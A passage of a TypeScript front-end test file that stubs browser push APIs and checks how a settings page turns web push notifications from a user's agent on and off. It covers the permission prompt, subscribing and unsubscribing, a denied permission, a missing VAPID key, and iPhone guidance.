    let current: { endpoint: string; toJSON(): unknown; unsubscribe(): Promise<boolean> } | null = null;
    let permission: NotificationPermission = "default";
    const registration = {
      pushManager: {
        getSubscription: async () => current,
        subscribe: async (options: { userVisibleOnly: boolean; applicationServerKey: Uint8Array }) => {
          log.push(`subscribe userVisibleOnly=${options.userVisibleOnly} key=${options.applicationServerKey.length} bytes`);
          current = {
            endpoint: SUBSCRIPTION.endpoint,
            toJSON: () => SUBSCRIPTION,
            unsubscribe: async () => {
              log.push("unsubscribe");
              current = null;
              return true;
            }
          };
          return current;
        }
      }
    };
    Object.defineProperty(window.navigator, "serviceWorker", {
      configurable: true,
      value: {
        getRegistration: async () => registration,
        register: async (url: string, options: { scope: string }) => {
          log.push(`register ${url} scope ${options.scope}`);
          return registration;
        },
        ready: Promise.resolve(registration)
      }
    });
    vi.stubGlobal("PushManager", class {});
    vi.stubGlobal("Notification", {
      get permission() {
        return permission;
      },
      requestPermission: async () => {
        log.push("ask permission");
        permission = permissionAfterAsking;
        return permission;
      }
    });
    return log;
  }

  /** `/api/push/key` answering `key`, and the subscription routes, recording each call and body. */
  function stubPushApi(key: string | null = KEY) {
    const calls: string[] = [];
    vi.stubGlobal(
      "fetch",
      vi.fn(async (input: RequestInfo | URL, init?: RequestInit) => {
        const url = String(input);
        if (url === "/api/entitlement") return Response.json(DEMO);
        if (url === "/api/push/key") return Response.json({ publicKey: key });
        if (url !== "/api/push/subscription") return new Response("Not found", { status: 404 });
        calls.push(`${init?.method} ${url} ${String(init?.body)}`);
        return new Response(null, { status: init?.method === "POST" ? 201 : 204 });
      })
    );
    return calls;
  }

  afterEach(() => {
    delete (window.navigator as { serviceWorker?: unknown }).serviceWorker;
  });

  it("turns notifications on: asks permission, subscribes with the deployment's key and hands the subscription to the agent; off unsubscribes and forgets it", async () => {
    const log = stubBrowser();
    const calls = stubPushApi();
    open("/settings");
    const toggle = (await screen.findByRole("switch", { name: "Notifications on this device" })) as HTMLInputElement;
    expect(toggle.checked).toBe(false);
    expect(screen.getByText(/Add to Home Screen/)).toBeTruthy();
    expect(calls).toEqual([]);

    fireEvent.click(toggle);
    await waitFor(() => expect(toggle.checked).toBe(true));
    expect(log).toEqual(["ask permission", "register /sw.js scope /", "subscribe userVisibleOnly=true key=65 bytes"]);
    expect(calls).toEqual([`POST /api/push/subscription ${JSON.stringify(SUBSCRIPTION)}`]);

    fireEvent.click(toggle);
    await waitFor(() => expect(toggle.checked).toBe(false));
    expect(calls.at(-1)).toBe(`DELETE /api/push/subscription ${JSON.stringify({ endpoint: SUBSCRIPTION.endpoint })}`);
    expect(log.at(-1)).toBe("unsubscribe");
  });

  it("subscribes nothing when the browser's permission is refused, and says how to allow it", async () => {
    const log = stubBrowser("denied");
    const calls = stubPushApi();
    open("/settings");
    fireEvent.click(await screen.findByRole("switch", { name: "Notifications on this device" }));
    expect((await screen.findByRole("alert")).textContent).toMatch(/^This browser blocks notifications from your agent/);
    expect(log).toEqual(["ask permission"]);
    expect(calls).toEqual([]);
  });

  it("hides the option when the deployment has no VAPID key", async () => {
    stubBrowser();
    stubPushApi(null);
    open("/settings");
    // The key request has answered once the other sections have loaded from theirs; then nothing appeared.
    await screen.findByText(/Your reminders and tasks couldn't be loaded/);
    await new Promise((resolve) => setTimeout(resolve, 20));
    expect(screen.queryByRole("switch", { name: "Notifications on this device" })).toBeNull();
    expect(screen.queryByRole("heading", { name: "Notifications" })).toBeNull();
  });

  it("says how to get them on an iPhone when this browser can't take push messages", async () => {
    stubPushApi();
    open("/settings");
    expect(await screen.findByText(/This browser can't show notifications from your agent\. On iPhone and iPad, notifications reach only the app added to your Home Screen/)).toBeTruthy();
    expect(screen.queryByRole("switch")).toBeNull();
  });
});
